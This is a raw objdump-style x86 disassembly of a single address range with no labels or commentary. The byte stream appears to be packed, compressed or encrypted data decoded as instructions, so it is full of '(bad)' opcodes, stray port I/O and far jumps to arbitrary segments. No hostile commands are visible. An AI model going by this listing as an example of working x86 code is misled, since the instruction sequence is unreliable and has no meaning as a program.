  420597:	mov    ebp,?
  420599:	(bad)  
  42059a:	or     al,0x7a
  42059c:	sbb    BYTE PTR [ecx-0x342feafc],bl
  4205a2:	mov    bl,0xef
  4205a4:	lock mov dh,0x15
  4205a7:	mov    esp,0x8914e889
  4205ac:	fdivr  QWORD PTR [edi]
  4205ae:	mov    ah,0x65
  4205b0:	lock jmp 0x35e55979
  4205b6:	push   edi
  4205b7:	ja     0x420548
  4205b9:	jp     0x4205fa
  4205bb:	mov    gs,WORD PTR [edx-0x57]
  4205be:	mov    esi,0xf1e81938
  4205c3:	ins    DWORD PTR es:[edi],dx
  4205c4:	pop    esi
  4205c5:	ret    0xacbc
  4205c8:	test   ecx,edi
  4205ca:	add    esi,DWORD PTR [edi-0x24]
  4205cd:	pop    edi
  4205ce:	cli    
  4205cf:	inc    eax
  4205d0:	push   ds
  4205d1:	lods   eax,DWORD PTR ds:[esi]
  4205d2:	cld    
  4205d3:	jbe    0x420611
  4205d5:	inc    BYTE PTR ds:0xf74bc5c0
  4205db:	jp     0x4205d7
  4205dd:	mov    ah,0xf0
  4205df:	jmp    0x18330547
  4205e4:	xchg   esi,eax
  4205e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205e6:	push   0x17
  4205e8:	(bad)  
  4205e9:	mov    eax,ds:0x834fa497
  4205ee:	xor    edi,DWORD PTR [ecx-0x1f]
  4205f1:	into   
  4205f2:	jmp    0x420641
  4205f4:	retf   0xe1bb
  4205f7:	mov    ebp,0x89fa128f
  4205fc:	pushf  
  4205fd:	out    dx,eax
  4205fe:	jb     0x420594
  420600:	cwde   
  420601:	fiadd  WORD PTR [ecx-0x3447e671]
  420607:	lods   eax,DWORD PTR ds:[esi]
  420608:	sub    BYTE PTR [ebx-0x240cbae3],0x41
  42060f:	daa    
  420610:	out    0x46,eax
  420612:	bound  esp,QWORD PTR [edi-0x230375d2]
  420618:	rol    BYTE PTR [ecx+0x704f706f],1
  42061e:	rcr    BYTE PTR [esi+0x5c042430],1
  420624:	mov    bl,0x5c
  420626:	xor    al,0x26
  420628:	les    edi,FWORD PTR ds:0xcc8678
  42062e:	xor    eax,0x8cee0efe
  420633:	or     eax,0x4615ef55
  420638:	ja     0x420627
  42063a:	push   ss
  42063b:	fptan  
  42063d:	jb     0x420678
  42063f:	in     al,0x4d
  420641:	repnz cs cwde 
  420644:	fld    DWORD PTR [esi+0x7a]
  420647:	xchg   esp,eax
  420648:	inc    esi
  420649:	mov    cl,0x38
  42064b:	jne    0x4205f1
  42064d:	mov    edx,0xc647f7ef
  420652:	mov    dl,0xc9
  420654:	jmp    0xf77e:0x966e0553
  42065b:	lea    edx,[edi-0x68]
  42065e:	inc    esi
  42065f:	(bad)  
  420660:	xor    bl,BYTE PTR [esi+0x29]
  420663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420664:	jne    0x420683
  420666:	push   ecx
  420667:	xchg   ebp,eax
  420668:	repnz in al,dx
  42066a:	jns    0x420665
  42066c:	xchg   DWORD PTR [edi],ebx
  42066e:	adc    DWORD PTR [edx-0x4b1d66f3],0xfffffff2
  420675:	sbb    al,0x38
  420677:	mov    ebx,0xa32fcec
  42067c:	ins    BYTE PTR es:[edi],dx
  42067d:	cmp    BYTE PTR [edi+eiz*2-0xce92403],bh
  420684:	mov    dh,0x16
  420686:	dec    edx
  420687:	jmp    0x4d9ea52f
  42068c:	mov    ecx,0x84a345b9
  420691:	ins    DWORD PTR es:[edi],dx
  420692:	int3   
  420693:	rcr    DWORD PTR [ecx],1
  420695:	and    eax,0x351ead04
  42069a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42069b:	in     al,0x15
  42069d:	inc    edi
  42069e:	(bad)  
  42069f:	cli    
  4206a0:	call   0x698853fb
  4206a5:	sub    eax,ebp
  4206a7:	ret    0x891
  4206aa:	lods   eax,DWORD PTR ds:[esi]
  4206ab:	jg     0x42071e
  4206ad:	(bad)  
  4206ae:	pusha  
  4206af:	adc    ah,BYTE PTR cs:[ecx+0x78da001b]
  4206b6:	push   edx
  4206b7:	in     eax,0xa8
  4206b9:	popf   
  4206ba:	dec    edi
  4206bb:	mov    BYTE PTR [esi+0x7a9e97c0],bl
  4206c1:	cmp    cl,bl
  4206c3:	add    al,0xd3
  4206c5:	mov    al,0xea
  4206c7:	test   DWORD PTR [ebp+0x31],eax
  4206ca:	in     al,dx
  4206cb:	cdq    
  4206cc:	mov    BYTE PTR ds:0x3652607c,ah
  4206d2:	clc    
  4206d3:	xchg   al,cl
  4206d5:	das    
  4206d6:	mov    ebp,0xd95e3f43
  4206db:	push   edx
  4206dc:	push   ebx
  4206dd:	int    0xdd
  4206df:	mov    ds:0xa366c2ed,al
  4206e4:	(bad)  
  4206e5:	sar    BYTE PTR [edx],cl
  4206e7:	and    ebx,DWORD PTR [ebx]
  4206e9:	xor    BYTE PTR [ecx],dh
  4206eb:	ds clc 
  4206ed:	test   DWORD PTR [ebx-0x6982ea0],0x38cb7557
  4206f7:	inc    edi
  4206f8:	and    BYTE PTR [ebp+0x50f8fcd9],ah
  4206fe:	sbb    dl,BYTE PTR [edx+0x19]
  420701:	jae    0x420712
  420703:	je     0x42071e
  420705:	clc    
  420706:	xlat   BYTE PTR ds:[ebx]
  420707:	mov    cs,WORD PTR [eax+0x63]
  42070a:	aam    0x5c
  42070c:	mov    ebp,ebx
  42070e:	push   0xba3d64c7
  420713:	sub    al,0x8c
  420715:	in     eax,dx
  420716:	dec    edi
  420717:	sub    BYTE PTR ds:0x3f81c97,cl
  42071d:	test   eax,eax
  42071f:	(bad)  
  420720:	(bad)  
  420721:	pushf  
  420722:	retf   
  420723:	sti    
  420724:	pop    ecx
  420725:	jmp    0x420782
  420727:	and    edi,DWORD PTR [esi+0x4d591915]
  42072d:	mov    esp,0xa5943298
  420732:	push   0x5a31756b
  420737:	loopne 0x4206e8
  420739:	or     al,0xea
  42073b:	mov    bl,BYTE PTR [ebx+0xed7ce7d]
  420741:	or     BYTE PTR [edi+0x522bed4f],cl
  420747:	sbb    ah,BYTE PTR [eax+eax*1]
  42074a:	loope  0x420743
  42074c:	mov    esi,0x6b83f9b8
  420751:	xchg   edi,eax
  420752:	sbb    eax,0x7370cfb
  420757:	push   edx
  420758:	icebp  
  420759:	out    0x1e,al
  42075b:	adc    esi,eax
  42075d:	pop    ss
  42075e:	sbb    al,0x59
  420760:	fs jmp 0xf298:0x140c1b4a
  420768:	add    edx,ecx
  42076a:	(bad)  
  42076b:	aam    0x9
  42076d:	add    ebp,DWORD PTR [esi+ecx*4]
  420770:	loopne 0x4207a1
  420772:	mov    ds:0x3b4e7226,al
  420777:	mov    esp,0x9b4ba0f3
  42077c:	inc    esi
  42077d:	add    ebp,ebp
  42077f:	ror    esp,0x2a
  420782:	cmc    
  420783:	dec    edx
  420784:	mov    WORD PTR ds:0x4da3ec19,es
  42078a:	shl    BYTE PTR [edx-0x27],0x22
  42078e:	push   eax
  42078f:	cmp    eax,0x3caeca8f
  420794:	loop   0x42079b
  420796:	jne    0x4207b1
  420798:	out    0x56,eax
  42079a:	fisubr DWORD PTR [esp+ebp*8]
  42079d:	xor    al,0x3c
  42079f:	xor    eax,0xfa1592d8
  4207a4:	xor    DWORD PTR [esi+eiz*8-0x7e],esp
  4207a8:	xor    eax,0x97029b26
  4207ad:	popf   
  4207ae:	sub    al,BYTE PTR [edx-0x6a1784a4]
  4207b4:	jae    0x420800
  4207b6:	or     eax,0xb07cb64f
  4207bb:	xchg   ebx,eax
  4207bc:	loopne 0x42075f
  4207be:	inc    ecx
  4207bf:	into   
  4207c0:	jmp    0x420789
  4207c2:	xchg   ebx,eax
  4207c3:	cdq    
  4207c4:	and    cl,BYTE PTR [esp+esi*8]
  4207c7:	inc    eax
  4207c8:	mov    bh,0x29
  4207ca:	jae    0x420759
  4207cc:	mov    eax,ds:0x9b9d340e
  4207d1:	mov    ebx,0x71a251a4
  4207d6:	pop    edi
  4207d7:	stos   DWORD PTR es:[edi],eax
  4207d8:	adc    al,0x30
  4207da:	jbe    0x4207ad
  4207dc:	imul   edi,DWORD PTR [esi-0x7057e0c6],0x26e3287f
  4207e6:	lahf   
  4207e7:	dec    ebx
  4207e8:	scas   al,BYTE PTR es:[edi]
  4207e9:	push   edx
  4207ea:	fs dec eax
  4207ec:	fs shl eax,1
  4207ef:	add    eax,0xb2e5a0a7
  4207f4:	rcr    ebx,0xb3
  4207f7:	lods   al,BYTE PTR ds:[esi]
  4207f8:	rol    BYTE PTR [ebp-0x454fc898],cl
  4207fe:	mov    edx,fs
  420800:	fsubr  st,st(2)
  420802:	repnz and al,0x90
  420805:	mov    dl,0xc0
  420807:	jne    0x420855
  420809:	mov    es,WORD PTR [ebx-0x21841f8]
  42080f:	shl    BYTE PTR [ecx],0x6b
  420812:	mov    al,ds:0x685ac423
  420817:	(bad)  
  420818:	push   edi
  420819:	arpl   WORD PTR [edi],bp
  42081b:	cli    
  42081c:	out    dx,eax
  42081d:	cdq    
  42081e:	test   DWORD PTR [ecx-0x58],esp
  420821:	fisttp WORD PTR [edi+edx*4]
  420824:	fucomip st,st(3)
  420826:	mov    WORD PTR [edx+edx*4-0x22c06e51],?
  42082d:	not    DWORD PTR ds:0x23cf8d05
  420833:	xchg   esp,eax
  420834:	xchg   esi,eax
  420835:	push   0xa5308fe9
  42083a:	jnp    0x42087a
  42083c:	and    ch,0x64
  42083f:	sub    DWORD PTR [edi-0x34],ebp
  420842:	lds    eax,FWORD PTR [ecx-0x25]
  420845:	ffree  st(2)
  420847:	cmp    BYTE PTR [edi+0x4d],ah
  42084a:	outs   dx,BYTE PTR ds:[esi]
  42084b:	jne    0x42084f
  42084d:	dec    ebp
  42084e:	fsubr  QWORD PTR [ecx]
  420850:	cmp    DWORD PTR [edx+esi*1-0x422ccb52],ebx
  420857:	test   al,0x66
  420859:	add    eax,0x78549104
  42085e:	adc    dh,BYTE PTR [eax+0xaaebaa0]
  420864:	dec    ecx
  420865:	ds ja  0x4208a3
  420868:	pop    eax
  420869:	dec    ebp
  42086a:	push   edx
  42086b:	dec    ecx
  42086c:	sbb    eax,0x3d9d2074
  420871:	adc    eax,0x88897067
  420876:	loope  0x4208f3
  420878:	pusha  
  420879:	mov    bl,0xdc
  42087b:	or     dh,BYTE PTR [esi-0x5d]
  42087e:	daa    
  42087f:	dec    ebx
  420880:	pop    es
  420881:	clc    
  420882:	and    DWORD PTR [ecx-0x7281ff2f],ebp
  420888:	dec    esp
  420889:	push   ebx
  42088a:	push   eax
  42088b:	pop    eax
  42088c:	retf   0x21de
  42088f:	inc    ebp
  420890:	jg     0x42089a
  420892:	jo     0x4208c0
  420894:	shl    BYTE PTR [esi],1
  420896:	cmc    
  420897:	sub    cl,BYTE PTR [ecx-0x19dde66e]
  42089d:	jmp    0x198eea9c
  4208a2:	push   ss
  4208a3:	pushf  
  4208a4:	daa    
  4208a5:	dec    edi
  4208a6:	mov    bl,BYTE PTR [ecx]
  4208a8:	imul   ebx,DWORD PTR [edi+0x5b991360],0x17
  4208af:	xchg   ecx,eax
  4208b0:	mov    eax,0xd5996ea9
  4208b5:	mov    ds:0xdcb851e2,al
  4208ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208bb:	inc    edx
  4208bc:	cmp    BYTE PTR ds:0xb716ac8c,0xb1
  4208c3:	fs inc eax
  4208c5:	ja     0x42086c
  4208c7:	mov    bl,0xb0
  4208c9:	cmp    esi,DWORD PTR [ebx+ecx*1+0x2b56b722]
  4208d0:	mov    ecx,0x46fdb94f
  4208d5:	inc    ebp
  4208d6:	pop    esi
  4208d7:	test   BYTE PTR [ecx-0x2360eb87],ch
  4208dd:	stos   BYTE PTR es:[edi],al
  4208de:	jns    0x420906
  4208e0:	mov    ah,BYTE PTR [ebx-0x69]
  4208e3:	mov    ebp,0xe024dc7b
  4208e8:	mov    esi,0xe656b1ca
  4208ed:	bswap  edi
  4208ef:	inc    ebx
  4208f0:	bound  ebp,QWORD PTR [ebx]
  4208f2:	lds    edx,FWORD PTR [ecx-0x59307a1b]
  4208f8:	adc    al,0xcf
  4208fa:	and    ebx,DWORD PTR es:[esi]
  4208fd:	jo     0x4208b3
  4208ff:	adc    ebp,ebx
  420901:	ror    esi,1
  420903:	xchg   edx,eax
  420904:	ffree  st(5)
  420906:	test   eax,0x716f5fa4
  42090b:	aam    0xad
  42090d:	push   0xffffffbf
  42090f:	je     0x42091e
  420911:	inc    edi
  420912:	cmp    eax,0xe0b5689f
  420917:	lock icebp 
  420919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42091a:	cmpxchg dl,bl
  42091d:	adc    BYTE PTR [edx-0x7ee44ca0],ah
  420923:	stos   BYTE PTR es:[edi],al
  420924:	xor    al,0x48
  420926:	leave  
  420927:	int3   
  420928:	pop    esi
  420929:	daa    
  42092a:	push   ecx
  42092b:	mov    ah,0x36
  42092d:	sti    
  42092e:	fmul   DWORD PTR [eax]
  420930:	or     ecx,edi
  420932:	popa   
  420933:	and    edi,esi
  420935:	push   edi
  420936:	cmpxchg ch,dl
  420939:	bound  edi,QWORD PTR [edi+0x3c]
  42093c:	pop    ebp
  42093d:	add    DWORD PTR [eax+0x704cadc5],ecx
  420943:	add    ebp,edi
  420945:	test   BYTE PTR [ebx+0x721a3f01],dh
  42094b:	retf   
  42094c:	stos   BYTE PTR es:[edi],al
  42094d:	push   0x5
  42094f:	push   ss
  420950:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420952:	mov    esi,DWORD PTR [edx-0x4bbf9e3f]
  420958:	lods   eax,DWORD PTR ds:[esi]
  420959:	sbb    al,0x5d
  42095b:	lahf   
  42095c:	lock push ebp
  42095e:	mov    WORD PTR [ebx-0x4f668027],?
  420964:	arpl   WORD PTR [ecx-0x6984ff2b],dx
  42096a:	arpl   WORD PTR [edx+0x3171c9ee],bx
  420970:	jmp    0x420956
  420972:	int    0x8c
  420974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420975:	jmp    0x14ae:0x671332d0
  42097c:	push   cs
  42097d:	push   edi
  42097e:	add    eax,0x1810ae83
  420983:	push   ss
  420984:	inc    edi
  420985:	(bad)  
  420987:	mov    esi,0xb112a626
  42098c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42098d:	add    dl,ah
  42098f:	aaa    
  420990:	jmp    0x420a11
  420992:	popf   
  420993:	dec    DWORD PTR [esi-0x71]
  420996:	or     dl,BYTE PTR [edi-0x698d4d9c]
  42099c:	xchg   ebx,eax
  42099d:	inc    ecx
  42099e:	xlat   BYTE PTR ds:[ebx]
  42099f:	and    edx,ebx
  4209a1:	push   DWORD PTR [ebx]
  4209a3:	or     bl,dl
  4209a5:	ins    BYTE PTR es:[edi],dx
  4209a6:	push   cs
  4209a7:	mov    ah,0x60
  4209a9:	out    dx,eax
  4209aa:	or     eax,0xad472158
  4209af:	test   eax,0x942898d5
  4209b4:	fcomp  DWORD PTR [esi-0x7a8c7221]
  4209ba:	gs dec esp
  4209bc:	adc    BYTE PTR [edx-0x76],dl
  4209bf:	xchg   esi,eax
  4209c0:	adc    eax,esi
  4209c2:	pop    eax
  4209c3:	sbb    BYTE PTR [eax],0x71
  4209c6:	lods   al,BYTE PTR ds:[esi]
  4209c7:	sub    ecx,ebx
  4209c9:	jecxz  0x4209bb
  4209cb:	inc    edx
  4209cc:	inc    bl
  4209ce:	in     al,0x39
  4209d0:	sbb    eax,0x4bd541
  4209d5:	ds jmp 0x2df7:0xa52da20b
  4209dd:	lds    edx,FWORD PTR [eax]
  4209df:	mov    ds:0xf78b54cc,al
  4209e4:	ror    BYTE PTR [edx-0x1c42b3e6],cl
  4209ea:	mov    esp,0x5b016a76
  4209ef:	push   ecx
  4209f0:	mov    al,ds:0x79158b47
  4209f5:	add    BYTE PTR ds:0xab7b7e6,dl
  4209fb:	dec    eax
  4209fc:	scas   eax,DWORD PTR es:[edi]
  4209fd:	jae    0x420a11
  4209ff:	adc    al,0xe4
  420a01:	sub    BYTE PTR [ebp+0x49],bl
  420a04:	mov    esp,0xc4ba3a4
  420a09:	imul   eax,DWORD PTR [ebp-0x1a341c10],0x7e
  420a10:	sub    dl,BYTE PTR [ebx+eax*1+0x53]
  420a14:	sub    BYTE PTR [esi],ch
  420a16:	mov    esi,DWORD PTR [ebx]
  420a18:	and    eax,0xec9ec544
  420a1d:	dec    esi
  420a1e:	ror    esi,cl
  420a20:	push   esi
  420a21:	sti    
  420a22:	xor    ch,BYTE PTR [esi]
  420a24:	cld    
  420a25:	sub    ebp,eax
  420a27:	aas    
  420a28:	jns    0x420a53
  420a2a:	jno    0x420a91
  420a2c:	dec    edx
  420a2d:	add    edx,edi
  420a2f:	enter  0x2ec2,0xdc
  420a33:	push   eax
  420a34:	dec    edi
  420a35:	outs   dx,BYTE PTR ds:[esi]
  420a36:	fdiv   st,st(0)
  420a38:	pushf  
  420a39:	aaa    
  420a3a:	mov    ebp,0x8bd33533
  420a3f:	jae    0x420a6a
  420a41:	mov    ebp,ebx
  420a43:	jmp    0x3e27:0x176caee8
  420a4a:	bswap  ebx
  420a4c:	test   BYTE PTR [ebx-0x368afb69],ch
  420a52:	dec    edx
  420a53:	fcomp  st(6)
  420a55:	aaa    
  420a56:	sbb    eax,0xa6747c15
  420a5b:	xchg   esp,eax
  420a5c:	pop    edi
  420a5d:	pusha  
  420a5e:	mov    ch,0xde
  420a60:	sub    BYTE PTR [ebp-0x1],ah
  420a63:	mov    cl,0xba
  420a65:	scas   eax,DWORD PTR es:[edi]
  420a66:	mov    eax,0x53b430be
  420a6b:	mov    ?,WORD PTR [ebx+ebx*8+0x261d184b]
  420a72:	mov    ebp,0x36cea090
  420a77:	inc    esp
  420a78:	dec    edi
  420a79:	xor    BYTE PTR [ebx-0x7ef11643],ch
  420a7f:	pop    edx
  420a80:	daa    
  420a81:	inc    eax
  420a82:	and    eax,0x8cf19a86
  420a87:	and    al,dh
  420a89:	popa   
  420a8a:	mov    bh,0xd8
  420a8c:	ficomp WORD PTR [esi+0x2d]
  420a8f:	cmc    
  420a90:	aas    
  420a91:	push   ds
  420a92:	stc    
  420a93:	push   edi
  420a94:	data16 mov BYTE PTR [eax],ch
  420a97:	and    cl,BYTE PTR [ecx-0xcd43361]
  420a9d:	(bad)  
  420a9e:	call   0x1186dca0
  420aa3:	pop    es
  420aa4:	sbb    BYTE PTR [esi+0x6e],0x22
  420aa8:	cmp    edx,DWORD PTR [ebx+0xe1c54d1]
  420aae:	iret   
  420aaf:	stos   BYTE PTR es:[edi],al
  420ab0:	dec    ecx
  420ab1:	and    BYTE PTR [ebp+0x5da1ea7f],0xd2
  420ab8:	push   ecx
  420ab9:	xchg   DWORD PTR [esi],esp
  420abb:	xchg   DWORD PTR [ebp-0x4],ebp
  420abe:	or     ecx,ebx
  420ac0:	mov    esp,0xa90f3894
  420ac5:	adc    edi,esi
  420ac7:	(bad)  
  420ac8:	jp     0x420aea
  420aca:	dec    ecx
  420acb:	jnp    0x420ad5
  420acd:	nop
  420ace:	lds    ebp,FWORD PTR ds:0xa233245e
  420ad4:	or     DWORD PTR [edi-0x69c71830],ecx
  420ada:	pop    edx
  420adb:	adc    ecx,ebx
  420add:	pop    eax
  420ade:	daa    
  420adf:	mov    edx,0xae0a1f56
  420ae4:	cmp    BYTE PTR [ebx+0x1c6c5dab],0x2c
  420aeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420aec:	(bad)  
  420aed:	cmp    eax,0xeed9ab30
  420af2:	mov    edi,0xabc5b63
  420af7:	test   ch,dl
  420af9:	dec    ebx
  420afa:	cmp    esi,DWORD PTR [edx+0x68]
  420afd:	stos   BYTE PTR es:[edi],al
  420afe:	jno    0x420b60
  420b00:	(bad)  
  420b01:	std    
  420b02:	mov    ebp,0x8dc47017
  420b07:	pop    ebp
  420b08:	test   DWORD PTR [ecx],eax
  420b0a:	(bad)  
  420b0b:	mov    dl,0x61
  420b0d:	iret   
  420b0e:	cmp    DWORD PTR [eax+eiz*4+0x3d],0xffffffac
  420b13:	xchg   ecx,eax
  420b14:	mov    edx,0xd8437dcb
  420b19:	sub    eax,DWORD PTR [edx+0x1cd677a]
  420b1f:	adc    BYTE PTR [edi+0x547da9b],0xd6
  420b26:	jmp    0x313b:0x70d1617c
  420b2d:	push   es
  420b2e:	jne    0x420b5d
  420b30:	sub    BYTE PTR ds:0x6d01fe73,ah
  420b36:	or     BYTE PTR [edi+edx*1],bl
  420b39:	retf   
  420b3a:	push   ebx
  420b3b:	add    eax,0xdf79a72c
  420b40:	or     DWORD PTR [esi],eax
  420b42:	pop    es
  420b43:	shl    ah,0xf2
  420b46:	mov    bl,0xfd
  420b48:	inc    ecx
  420b49:	xchg   ebp,eax
  420b4a:	enter  0x8fd3,0xe6
  420b4e:	loopne 0x420b0c
  420b50:	cmp    ch,cl
  420b52:	mov    bl,0x48
  420b54:	and    al,0x32
  420b56:	add    DWORD PTR [eax+0x50678cce],0xc00fc443
  420b60:	fwait
  420b61:	xor    eax,0x36bc9297
  420b66:	push   0xffffffb2
  420b68:	aaa    
  420b69:	cmc    
  420b6a:	mov    bl,0xf8
  420b6c:	fprem1 
  420b6e:	dec    esi
  420b6f:	and    ah,BYTE PTR [ecx+0x31]
  420b72:	icebp  
  420b73:	enter  0xadd4,0xcb
  420b77:	xor    ch,BYTE PTR ds:0xf58b7a38
  420b7d:	mov    esi,0x1c6bc03e
  420b82:	int    0x92
  420b84:	rcr    DWORD PTR [esi+eax*2-0x61],cl
  420b88:	dec    ebp
  420b89:	inc    eax
  420b8a:	jns    0x420b86
  420b8c:	jnp    0x420b1b
  420b8e:	cdq    
  420b8f:	sub    eax,0x3bc5e17a
  420b94:	es push esp
  420b96:	xor    esp,ecx
  420b98:	ds or  al,0x71
  420b9b:	add    ebx,ecx
  420b9d:	in     al,dx
  420b9e:	retf   0xc5cf
  420ba1:	in     al,0xc7
  420ba3:	daa    
  420ba4:	push   ebx
  420ba5:	int3   
  420ba6:	xor    ah,cl
  420ba8:	add    BYTE PTR [ebx+0x15],0xb4
  420bac:	xor    DWORD PTR [esi+0x6d],ebx
  420baf:	jmp    0x8f3a:0x316f48b7
  420bb6:	or     ebx,esi
  420bb8:	push   esi
  420bb9:	jnp    0x420b44
  420bbb:	mov    bl,0x59
  420bbd:	cdq    
  420bbe:	mov    ebx,DWORD PTR [edi]
  420bc0:	jnp    0x420bd9
  420bc2:	sub    eax,ebx
  420bc4:	pop    eax
  420bc6:	sbb    eax,0x8693d052
  420bcb:	cmp    al,0x72
  420bcd:	arpl   WORD PTR [esp+eax*1],cx
  420bd0:	dec    ebp
  420bd1:	xchg   edi,eax
  420bd2:	ss nop
  420bd4:	xchg   esp,eax
  420bd5:	pop    ebx
  420bd6:	and    al,0x19
  420bd8:	add    al,0xfc
  420bda:	shl    edx,1
  420bdc:	cmp    eax,0x298d58fa
  420be1:	test   esp,ecx
  420be3:	les    ecx,FWORD PTR [eax]
  420be5:	or     al,0x64
  420be7:	out    0xd1,eax
  420be9:	xchg   BYTE PTR [edi+eax*2-0x31],ch
  420bed:	inc    edx
  420bee:	cwde   
  420bef:	xchg   edi,eax
  420bf0:	cmp    al,0x23
  420bf2:	xchg   ebp,eax
  420bf3:	aas    
  420bf4:	loop   0x420c5c
  420bf6:	outs   dx,DWORD PTR ds:[esi]
  420bf7:	pushf  
  420bf8:	call   0xf3af:0x29140180
  420bff:	mov    ch,0x3e
  420c01:	rcr    DWORD PTR [edi+ebp*4-0x7eaec7b2],0x26
  420c09:	pop    edx
  420c0a:	sbb    ch,bl
  420c0c:	and    eax,0x401df4be
  420c11:	fnsave [ebx-0xb77a536]
  420c17:	mov    edx,0xa083e6a4
  420c1c:	sbb    al,BYTE PTR [eax]
  420c1e:	mov    dl,0x1c
  420c20:	mov    eax,ds:0xfd074ae8
  420c25:	(bad)  
  420c26:	scas   al,BYTE PTR es:[edi]
  420c27:	mov    edi,0x490ce308
  420c2c:	(bad)  
  420c2d:	pop    ss
  420c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c2f:	cld    
  420c30:	ret    0xe16d
  420c33:	ins    DWORD PTR es:[edi],dx
  420c34:	sbb    esi,DWORD PTR [esi-0x557b1a93]
  420c3a:	pop    esp
  420c3b:	adc    DWORD PTR [edi+0x2d4d09f4],ebx
  420c41:	fimul  WORD PTR ds:0x425692e8
  420c47:	nop
  420c48:	fild   QWORD PTR cs:[eax+edi*4]
  420c4c:	loopne 0x420bd9
  420c4e:	in     eax,dx
  420c4f:	sahf   
  420c50:	out    0x81,al
  420c52:	and    bh,BYTE PTR [ecx-0xa]
  420c55:	sbb    edi,DWORD PTR [edi+esi*8]
  420c58:	jmp    0x503d:0xc8259826
  420c5f:	scas   eax,DWORD PTR es:[edi]
  420c60:	xchg   ebx,eax
  420c61:	imul   esi,DWORD PTR [esi+0x49],0x50
  420c65:	scas   al,BYTE PTR es:[edi]
  420c66:	cmp    ebp,DWORD PTR [edi]
  420c68:	dec    esp
  420c69:	(bad)
  420c6d:	sbb    cl,BYTE PTR [ebx+0x2ef64b8e]
  420c73:	mov    edi,0x61d1cb3e
  420c78:	sti    
  420c79:	mov    ds,WORD PTR [ecx+0x31]
  420c7c:	inc    ebx
  420c7d:	xchg   ecx,eax
  420c7e:	xor    al,0x97
  420c80:	xchg   BYTE PTR [ecx+edi*2-0x74940a43],bl
  420c87:	(bad)  
  420c88:	out    0x8d,eax
  420c8a:	arpl   WORD PTR [ecx+edi*2-0x66c588b6],si
  420c91:	out    dx,eax
  420c92:	(bad)  
  420c93:	fstp   st(4)
  420c95:	lahf   
  420c96:	daa    
  420c97:	in     eax,0x7d
  420c99:	je     0x420c52
  420c9b:	sub    eax,DWORD PTR [ecx-0x52dfe584]
  420ca1:	int    0x19
  420ca3:	push   ecx
  420ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ca5:	outs   dx,DWORD PTR ds:[esi]
  420ca6:	mov    edx,esp
  420ca8:	adc    DWORD PTR [eax],eax
  420caa:	enter  0x7060,0x66
  420cae:	jle    0x420cdf
  420cb0:	pop    ecx
  420cb1:	cmp    cl,BYTE PTR [ebp-0x9]
  420cb4:	mov    eax,0xdcf0f5f4
  420cb9:	mov    ss,WORD PTR [ebp+0x11]
  420cbc:	cmp    dh,BYTE PTR [edi]
  420cbe:	leave  
  420cbf:	sbb    BYTE PTR [esi+0x40507e0b],cl
  420cc5:	dec    ebx
  420cc6:	out    0x6f,eax
  420cc8:	jns    0x420ca4
  420cca:	jge    0x420ccf
  420ccc:	push   es
  420ccd:	mov    edi,0x1ee6e4bc
  420cd2:	enter  0x97f5,0x25
  420cd6:	repnz sbb DWORD PTR [bp+si+0x709a],0xffffff93
  420cdd:	pop    ebx
  420cde:	sub    eax,0xb5d137fa
  420ce3:	add    esi,DWORD PTR [edi]
  420ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ce6:	jp     0x420c9b
  420ce8:	pop    ebx
  420ce9:	push   eax
  420cea:	push   esi
  420ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cec:	je     0x420d52
  420cee:	adc    al,0xb6
  420cf0:	jle    0x420cc1
  420cf2:	mov    ecx,DWORD PTR [edx-0xe]
  420cf5:	and    al,0xe
  420cf7:	mov    ds:0xc96567e,al
  420cfc:	pusha  
  420cfd:	out    dx,al
  420cfe:	icebp  
  420cff:	dec    ebx
  420d00:	mov    bh,0xd4
  420d02:	push   ss
  420d03:	(bad)  
  420d04:	fwait
  420d05:	xchg   ebx,eax
  420d06:	inc    ecx
  420d07:	repnz xchg edx,eax
  420d09:	retf   
  420d0a:	clc    
  420d0b:	add    ch,ch
  420d0d:	popf   
  420d0e:	rcl    DWORD PTR [ecx],0x9b
  420d11:	mov    bh,al
  420d13:	and    DWORD PTR [edx-0x26],eax
  420d16:	lock outs dx,BYTE PTR ds:[esi]
  420d18:	dec    edi
  420d19:	ds dec edx
  420d1b:	fist   WORD PTR [ecx-0x3cc95f95]
  420d21:	idiv   dl
  420d23:	adc    eax,DWORD PTR [ecx+eax*8]
  420d26:	addr16 inc esi
  420d28:	add    BYTE PTR [edi+0x66],ah
  420d2b:	lods   al,BYTE PTR ds:[esi]
  420d2c:	stos   BYTE PTR es:[edi],al
  420d2d:	xchg   esp,eax
  420d2e:	dec    edx
  420d2f:	daa    
  420d30:	xlat   BYTE PTR ds:[ebx]
  420d31:	xchg   esi,eax
  420d32:	daa    
  420d33:	inc    eax
  420d34:	cs pop ds
  420d36:	xchg   esi,eax
  420d37:	mov    esi,0x5362b187
  420d3c:	ror    DWORD PTR [ecx],1
  420d3e:	stc    
  420d3f:	outs   dx,DWORD PTR ds:[esi]
  420d40:	(bad)  
  420d41:	(bad)  
  420d42:	icebp  
  420d43:	loop   0x420d31
  420d45:	xor    al,BYTE PTR [ebx+0x1b39cdfe]
  420d4b:	cmp    DWORD PTR [ebx+0x2020fa54],edi
  420d51:	repz push 0x4f8e4f86
  420d57:	retf   0x604f
  420d5a:	sub    esp,DWORD PTR [edx]
  420d5c:	inc    edi
  420d5d:	mov    ds:0x2220e6f6,eax
  420d62:	cmovae esi,DWORD PTR [esi-0x2a7f28b0]
  420d69:	adc    eax,0x56186d8f
  420d6e:	retf   0x85b5
  420d71:	sub    cl,BYTE PTR [ecx-0x29]
  420d74:	and    ebp,DWORD PTR [ebp-0x43f0a778]
  420d7a:	sti    
  420d7b:	pop    ebx
  420d7c:	lds    edx,FWORD PTR [ebx]
  420d7e:	or     BYTE PTR [eax-0x7d],ch
  420d81:	mov    ebx,0x14deb6af
  420d86:	cli    
  420d87:	cdq    
